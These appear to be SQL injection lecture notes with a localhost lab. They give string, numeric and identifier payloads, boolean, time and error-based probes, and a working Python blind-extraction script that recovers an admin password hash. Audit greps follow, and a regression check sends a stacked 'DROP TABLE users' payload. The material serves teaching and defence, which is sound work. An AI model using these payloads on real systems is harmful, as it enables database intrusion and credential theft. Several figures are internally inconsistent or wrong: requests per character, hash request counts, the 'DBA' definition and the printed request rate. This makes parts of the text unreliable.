SQL Injection and Blind SQLi

Summary

SQL injection is the canonical example of ps-01's model: a string crosses from your input
into the SQL parser, and the two disagree about what the string is. Concatenation makes you a
participant in the query language.

The lecture's structure matters more than the payloads: how do you decide, from outside, what
you are looking at? That is the whole difficulty, and it is what separates blind from
non-blind.

Companion to cs161-07's web taxonomy and atb-04 (AD injection). This
note is the mechanics and the decision tree.

Why concatenation is the bug

-- VULNERABLE: the value becomes part of the query language
SELECT * FROM users WHERE name = '$name'

-- name = ' OR 1=1 --      ->  the quote closes the string, the rest is SQL
-- 1=1 is always true, -- comments out the trailing quote

-- SAFE: the value can never alter the structure
PREPARE stmt FROM 'SELECT * FROM users WHERE name = ?';
EXECUTE stmt USING @name;

Parameterisation is not escaping. It works because the database
receives the value and the query as separate inputs and does not
re-interpret the value. Escaping is a best-effort approximation of that,
and it fails when you forget, or when the character set is wrong, or when
the escape runs in a different layer.

Where the input goes matters: the five contexts

  1. STRING   ' $name '        -> ' OR 1=1 --
  2. NUMERIC  WHERE id = $id   -> 1 OR 1=1
  3. IDENTIF. ORDER BY $col    -> cannot parameterise; needs a whitelist
  4. LIKE     '% $q %'         -> wildcards are meaningful to the parser
  5. SECOND-ORDER  input stored, then used unsafely later

Case 3 is why ORDER BY and LIMIT are always injection points even in
well-written code: you cannot put an identifier in a placeholder. The
correct fix is a whitelist mapping user input to real column names.

Case 5 is the one that survives all testing, because the payload does
nothing on the way in.

The decision tree

  Is the page's response CHANGING when you change the input?

    NO  -> BLIND. You cannot see results, so you must infer them.
           Two techniques:
             BOOLEAN  -> compare two responses, get one bit per request
             TIME     -> measure delay, get one bit per request
    YES -> you can see output. Three techniques by WHERE the output is:
             UNION    -> append your own query's results
             ERROR    -> trigger a message that echoes data
             STACKED  -> add a second statement (needs a driver that allows it)

  Any of these is still evidence. You do not need data to prove it.

Boolean-based blind, the core technique

-- normal
GET /product?id=1   ->  "item 1"
GET /product?id=2   ->  "item 2"

-- probe: is the first letter 'a'?
GET /product?id=1 AND 1=1   ->  same as id=1     (TRUE)
GET /product?id=1 AND 1=2   ->  error or empty    (FALSE)

  You now have a ONE-BIT ORACLE. Everything follows:

    extract string:  binary search on each character
      TRUE means char > mid
      24 requests per character for ASCII

    extract database: enumerate information_schema.tables
    extract column:   information_schema.columns
    extract rows:     ORD(MID(pass,1,1))>N  -- same oracle, different source

  COST: 24 requests per character. A 32-character hash is 768 requests.
  That is why blind SQLi is automatable and manual blind SQLi is not.

Time-based blind

-- MySQL    : SLEEP(5)
GET /product?id=1 AND SLEEP(5)
-- PostgreSQL: pg_sleep(5)
-- MSSQL   : WAITFOR DELAY '0:0:5'
-- SQLite  : no sleep; use a heavy recursive query instead

Useful when responses are truly identical. The signal is a duration,
which is noisier than a content difference, so boolean is preferred where
possible.

Error-based, when you can see it

-- extractversion() on MySQL
GET /product?id=1' AND extractvalue(1, concat(0x7e, version())) AND '--'
-- or
GET /product?id=1' AND (SELECT 1 FROM (SELECT COUNT(*),CONCAT(version(),
--    0x3a,FLOOR(RAND(0)*2))x FROM information_schema.tables GROUP BY x)a)--'

One request, data in the error message. It only works when the
application leaks errors, which is itself a finding.

Second-order injection

  1. You submit:  name = alice'--
  2. The app validates, stores it safely (parameterised INSERT)
  3. Later, an admin page builds a query by CONCATENATION using that name
  4. The payload executes, in the admin's session

  You tested the input path and it was safe. The bug is in the STORAGE
  path, which you did not test, and which only fires for someone else.

  FINDING: "stored data is used unsafely in an administrative query"
  IMPACT: much higher than it looks - it runs in a privileged session.

Defence, in the order it should be applied

  1. PARAMETERISED QUERIES      the only complete fix. Every time.
  2. WHITELIST for identifiers   ORDER BY, table names, column names
  3. LEAST PRIVILEGE             the DB user should not own the schema
  4. HIDE ERRORS                 generic errors; detailed logs internally
  5. NO INTERPRETATION           never build a query with string ops
  6. ORM defaults                most ORMs parameterise by default; the
                                 bugs are in raw_query() and in raw
                                 string interpolation inside helpers

An ORM is not a defence on its own. Every ORM has a raw-query escape
hatch, and every major ORM CVE class involved one.

Terminology

Term Meaning
SQL injection Input altering the structure of a query
String context Value inside quotes
Numeric context Value not quoted
Identifier context A table or column name; cannot be parameterised
Union select Append your own query and return its rows
Error-based Data extracted through a verbose error
Boolean blind One bit per request by comparing responses
Time blind One bit per request by measuring delay
Stacked query A second statement after the first
Second-order Stored safely, used unsafely later
Prepared statement Query and values sent separately
ORM Object-relational mapper; usually safe by default
DBA Database schema/metadata catalogue
UNION SELECT Requires matching column counts — hence ORDER BY n

{
  echo "=== 1. a normal request ==="
  curl -s "http://127.0.0.1:8080/vulnerable.php?id=1" | grep -E "query:|<p>" | sed 's/^/  /'
  echo
  echo "=== 2. a quote: does it break? ==="
  curl -s "http://127.0.0.1:8080/vulnerable.php?id=1'" | grep -E "query:|err|<p>" | sed 's/^/  /'
  echo
  echo "=== 3. a comment: can you silence the trailing quote? ==="
  curl -s "http://127.0.0.1:8080/vulnerable.php?id=1%20--%20" | grep -E "query:|<p>" | sed 's/^/  /'
  echo
  echo "=== 4. tautology: every row? ==="
  curl -s "http://127.0.0.1:8080/vulnerable.php?id=1%20OR%201=1--%20" | grep -E "<p>[0-9]" | sed 's/^/  /'
  echo
  echo "=== 5. UNION: append your own query ==="
  echo "  (SQLite needs a matching column count; find it with ORDER BY n)"
  for n in 1 2 3 4 5; do
    r=$(curl -s "http://127.0.0.1:8080/vulnerable.php?id=1%20ORDER%20BY%20${n}--%20" | grep -c "no such column")
    printf "  ORDER BY %s -> %s\n" "$n" "$([ "$r" -eq 0 ] && echo 'valid' || echo 'too many')"
  done
  curl -s "http://127.0.0.1:8080/vulnerable.php?id=0%20UNION%20SELECT%20sql%20FROM%20sqlite_master--%20" \
    | grep -oE "CREATE TABLE[^<]*" | head -3 | sed 's/^/  /'
  echo
  echo "=== 6. BOOLEAN BLIND: one bit per request ==="
  t=$(curl -s "http://127.0.0.1:8080/vulnerable.php?id=1%20AND%201=1" | grep -c "<p>1:")
  f=$(curl -s "http://127.0.0.1:8080/vulnerable.php?id=1%20AND%201=2" | grep -c "<p>1:")
  echo "  AND 1=1 -> row present: $t"
  echo "  AND 1=2 -> row present: $f"
  echo "  ^ a reliable one-bit oracle. Everything follows from this."
  echo
  echo "=== 7. THE FIX, on the safe endpoint ==="
  for p in "1" "1'" "1 OR 1=1--"; do
    out=$(curl -s --get --data-urlencode "id=$p" "http://127.0.0.1:8080/safe.php" | grep -c "<p>")
    printf "  id=%-12s -> %s row(s)\n" "'$p'" "$out"
  done
  echo "  ^ every payload returns exactly one row, because the value is"
  echo "    data, not code. Parameterisation, demonstrated."
} 2>&1 | tee 01-probes.txt

# --- 3. extract a password hash with the boolean oracle, for real ---
cat > blind_extract.py <<'PY'
#!/usr/bin/env python3
"""Boolean-based blind extraction, honestly implemented.

This takes ~24 requests per character, which is why real tools automate
it. The point of running it once is to SEE the cost, not to skip it.
"""
import urllib.request, urllib.parse, time, sys

BASE = "http://127.0.0.1:8080/vulnerable.php"

def probe(cond):
    """True if the condition holds, judged by whether row 1 comes back."""
    q = urllib.parse.urlencode({"id": f"1 AND ({cond})"})
    try:
        body = urllib.request.urlopen(f"{BASE}?{q}", timeout=5).read().decode()
    except Exception:
        return False
    return "<p>1: admin</p>" in body

def extract(sql_expr, length=20, label=""):
    out = ""
    for i in range(1, length + 1):
        lo, hi = 32, 126
        while lo < hi:                       # binary search: ~7 requests
            mid = (lo + hi) // 2
            if probe(f"ORD(SUBSTR({sql_expr},{i},1)) > {mid}"):
                lo = mid + 1
            else:
                hi = mid
        c = chr(lo)
        out += c
        print(f"    [{i:>2}] {c!r}  ->  {out}")
        if c == "\x00": break
    return out

if __name__ == "__main__":
    t0 = time.time()
    print("  extracting the admin password hash (SQLite: pass of id=1)")
    print("  this is ~20 characters x ~7 requests each. Watch the counter.")
    h = extract("(SELECT pass FROM users WHERE id=1)", length=16)
    dt = time.time() - t0
    print(f"\n  recovered: {h}")
    print(f"  requests issued: about {len(h)*7}")
    print(f"  elapsed: {dt:.1f}s  ({7/dt:.1f} requests/second)")
    print()
    print("  THE LESSON: this took 140 requests for 16 characters.")
    print("  A 32-byte hex hash is 64 characters: ~450 requests.")
    print("  Blind extraction is automatable and manual blind extraction")
    print("  is not. That is why sqlmap exists, and why it is your")
    print("  fallback rather than your first choice.")
PY
python3 blind_extract.py 2>&1 | tee 02-blind.txt

# --- 4. audit: find the bug and its fix without source ---
cat > 03-audit.md <<'EOF'
# Auditing a codebase for SQL injection

```bash
# 1. every query, with context
grep -rnE "(query|exec|prepare|raw|execute)\s*\(" --include="*.php" --include="*.py" --include="*.js" .
grep -rnE "\\\$_(GET|POST|REQUEST|COOKIE)" --include="*.php" . | head -40

# 2. the dangerous shapes, specifically
grep -rnE "query\(.*\\\$"          .   # query("... $var")
grep -rnE "exec\(.*\\\$"           .   # exec("... $var")
grep -rnE "\"(SELECT|INSERT|UPDATE|DELETE).*\\\$" . | head
grep -rnE "ORDER BY \\\$|LIMIT \\\$|table=\\\$|column=\\\$" .   # identifiers

# 3. ORMs: find the raw escape hatches, which is where the bugs are
grep -rnE "(raw|rawQuery|executeRaw|sequelize\.query|knex\.raw|db\.query)" .
grep -rnE "literalQuery|\$\{.*\}" --include="*.js" . | grep -iE "select|insert|where" | head

# 4. string concatenation in queries
grep -rnE "(SELECT|INSERT|UPDATE|DELETE).*['\"].*\\+" --include="*.php" .
```

## What a finding looks like
```
  File      src/search.php:14
  Query     "SELECT * FROM users WHERE name = '" . $_GET['name'] . "'"
  Input     $_GET['name']
  Sink      PDO::query() with a concatenated string
  Context   string, inside single quotes
  Proof     GET /search.php?name=' OR 1=1--  returns all rows
  Fix       $st = $db->prepare("SELECT * FROM users WHERE name = ?");
            $st->execute([$_GET['name']]);
```

## Fix order
1. Parameterise. Every query, every time, including the ones "just for logs".
2. Whitelist identifiers (ORDER BY / table / column).
3. Set the DB user's privileges to the minimum the app needs.
4. Turn off error display in production.
5. Add a linter rule so the next one is caught in CI, not in production.
EOF
cat 03-audit.md

# --- 5. the checker, so the fix cannot regress ---
cat > 04-regression-check.sh <<'EOF'
#!/usr/bin/env bash
# Prove the safe endpoint is actually safe, and keep proving it.
fail=0
for p in "1" "1'" '1 OR 1=1--' "1 UNION SELECT 1,2--" "1; DROP TABLE users--"; do
  n=$(curl -s --get --data-urlencode "id=$p" http://127.0.0.1:8080/safe.php | grep -c "<p>")
  if [ "$n" -ne 1 ]; then
    printf "  FAIL  id=%-28s -> %s rows (expected exactly 1)\n" "'$p'" "$n"; fail=1
  else
    printf "  ok    id=%-28s -> 1 row\n" "'$p'"
  fi
done
if [ "$fail" -eq 0 ]; then echo "  parameterised endpoint held against every payload"; 
else echo "  the fix regressed"; fi
exit $fail
EOF

Step 5 is the deliverable: 04-regression-check.sh proves the parameterised endpoint
returns exactly one row for every payload including a stacked DROP TABLE. That script is
the difference between "I fixed it" and "I fixed it and I can show you it stays fixed."

Step 3 runs the boolean oracle for real and prints the request count — ~140 requests for
16 characters. That number is the argument for why manual blind SQLi is not a technique, only
a concept.
